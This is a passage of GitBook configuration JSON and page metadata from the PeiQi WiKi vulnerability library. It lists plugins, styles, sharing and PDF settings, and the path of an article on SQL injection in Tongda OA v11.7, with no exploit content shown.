任意文件删除&RCE.md","articles":[]},"dir":"ltr"},"config":{"plugins":["back-to-top-button","expandable-chapters","theme-comscore","splitter","alerts","chapter-fold","code","github","favicon","accordion","-lunr","-search","search-pro","emphasize","-sharing","sharing-plus","tbfed-pagefooter","lightbox","flexible-alerts","pageview-count","livereload"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"tbfed-pagefooter":{"copyright":"PeiQi WiKi文库","modify_label":"文件更新时间：","modify_format":"YYYY-MM-DD HH:mm:ss"},"chapter-fold":{},"emphasize":{},"github":{"url":"https://github.com/PeiQi0/PeiQi-WIKI"},"livereload":{},"splitter":{},"search-pro":{},"accordion":{},"sharing-plus":{"qq":false,"all":["facebook","google","twitter","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":true,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":true,"messenger":false,"line":false,"vk":false,"pocket":true,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"code":{"copyButtons":true},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"favicon":{},"lightbox":{"jquery":true,"sameUuid":false},"theme-comscore":{},"back-to-top-button":{},"pageview-count":{},"alerts":{},"flexible-alerts":{"danger":{"className":"danger","icon":"fa fa-ban","label":"Attention"},"note":{"className":"info","icon":"fa fa-info-circle","label":"Note"},"style":"callout","tip":{"className":"tip","icon":"fa fa-lightbulb-o","label":"Tip"},"warning":{"className":"warning","icon":"fa fa-exclamation-triangle","label":"Warning"}},"sharing":{},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"expandable-chapters":{}},"theme":"default","author":"PeiQi","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"PeiQi WiKi文库","language":"zh-hans","gitbook":"*","description":"WiKi文库"},"file":{"path":"PeiQi_Wiki/OA产品漏洞/通达OA/通达OA v11.7 后台SQL注入.md","mtime":"2020-12-07T02:49:31.748Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2021-04-01T12:57:07.542Z"},"basePath":"../../..","book":{"language":""}});
         });
     </script>
 </div>
